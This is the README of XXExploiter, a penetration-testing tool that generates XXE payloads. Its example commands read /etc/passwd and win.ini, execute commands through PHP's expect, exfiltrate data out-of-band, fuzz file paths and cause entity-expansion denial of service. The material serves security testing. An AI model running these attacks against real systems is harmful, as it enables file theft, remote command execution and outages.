# XXExploiter 

https://securityonline.info/xxexploiter-tool-to-help-exploit-xxe-vulnerabilities/
  
![Build](https://github.com/luisfontes19/xxexploiter/workflows/Build/badge.svg)
[![codecov](https://codecov.io/gh/luisfontes19/xxexploiter/branch/master/graph/badge.svg)](https://codecov.io/gh/luisfontes19/xxexploiter)
[![Known Vulnerabilities](https://snyk.io/test/github/luisfontes19/xxexploiter/badge.svg?targetFile=package.json)](https://snyk.io/test/github/luisfontes19/xxexploiter?targetFile=package.json)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

![XXExploiter](banner.png?raw=true)


It generates the XML payloads, and automatically starts a server to serve the needed DTD's or to do data exfiltration.   

## Installation  
  
```
#install node and npm if you don't have it yet 
npm install -g xxexploiter
```
  
## Building & Running  from source
This is a simple Node application written with typescript. So you can build it as you build other apps:  
(install node and npm first, if you dont have them)  
```  
npm install  
npm run build  
#you may need to npm install typescript -g in order for 'npm build' to succeed 
```  
  
To run the app you can do it with one of 3 ways:  
  
```  
npm start [args]  
node dist/index.js [args]  
npm link #and now just call xxexploiter
```  

Or you can install it on your system:

```
npm link
```
  
## Usage  
  
```  
Usage: xxexploiter [command] [options]

Commands:
  xxexploiter file [file_to_read]  Use XXE to do a request
  xxexploiter request [URL]        Use XXE to do a request
  xxexploiter expect [command]     Use XXE to execute a command through PHP's expect
  xxexploiter xee [expantions]     Generate a huge content by resolving entities

Fuzzing Specific Options
  -w, --wordlist        Path to a wordlist to be used with the fuzz command. Use {{FUZZ}} placeholder in the command arg
                        for the magic.
  -y, --success-string  String to search for a success response in the requests. Not usefull for blind attacks
  -n, --error-string    String to search for an error response in the request. Not usefull for blind attacks

Options:
  --version             Show version number                                                                    [boolean]
  -s, --server          Server address for OOB and DTD
  -p, --port            Server port for OOB and DTDs. Default: 7777
  -t, --template        path to an XML template where to inject payload
  -m, --mode            Extraction Mode: xml, oob, cdata. Default: xml
  -e, --encode          Extraction Encoding: none, phpbase64. Default: none
  -o, --output          Output for the XML payload file. Default is to console
  -x                    Use a request to automatically send the xml file
  -X, --request-output  Output the response from -x option. If not defined goes to stdout
  --verbose             Enable some messages help for understanding whats happening
  --doctype             Specify the name of the doctype to be injected. Default is xxexploiter
  -h, --help            Show help                                                                              [boolean]

Examples:
  xxexploiter expect ls
  xxexploiter -s 127.0.0.1 expect ls -e phpbase64 -m oob -o output.xml
  xxexploiter -s 127.0.0.1 file /c/windows/win.ini -t xmltemplate.xml -m oob
  xxexploiter xee 900000000 -o output.xml
  xxexploiter file /etc/passwd -x request.txt -t template.xml
  xxexploiter file /root/{FUZZ} -w wordlist.txt -n "not found" -x request.txt

Extra Info:
  - When using the xml or cdata modes, add the placeholder '{{XXE}}' in the field where you want the entity content to
  be injected
  - When specifiying file paths for windows use forward slash.
  - OOB: Out Of Bound: You can use this option to send the data processed by the xml parser, to your local webserver.
  Usefull with blind attacks
  - When using XML mode, it may break the XML parsing if XML reserved characters are loaded, so you may want to use
  cdata
  - When using the request option, you can specify the placeholder to inject the payload with {{XXE}} or {{XXE_B64}}
  - When fuzzing you can add the {{FUZZ}} keyword in the main command argument.
  - You can specify a string to filter successfull requests when fuzzing, either by supplying an expected error string,
  or an expected success string
```  

### Examples

#### Simple payload Generation
[![asciicast](https://asciinema.org/a/315867.svg)](https://asciinema.org/a/315867)

#### Automating request to send payload
[![asciicast](https://asciinema.org/a/315872.svg)](https://asciinema.org/a/315872)

#### OOB Extraction with automated request
[![asciicast](https://asciinema.org/a/315873.svg)](https://asciinema.org/a/315873)

#### Fuzzing
[![asciicast](https://asciinema.org/a/315876.svg)](https://asciinema.org/a/315876)
   
## Some notes:  
  
If you choose to use OOB or CDATA mode, XXExploiter will generate the necessary dtd to be included, and will start a server to host them. Have in mind that if you use these options you should set the server address  
  
If you include content in the body of the XML have in mind that XML restricted characters like '<' may break the parsing so be sure to use CDATA or PHP's base64encode  
  
Most of languages limit the number of entity expantions, or the total length of the content expanded, so make sure you test XEE on your machine first, with the same conditions as the target  
  
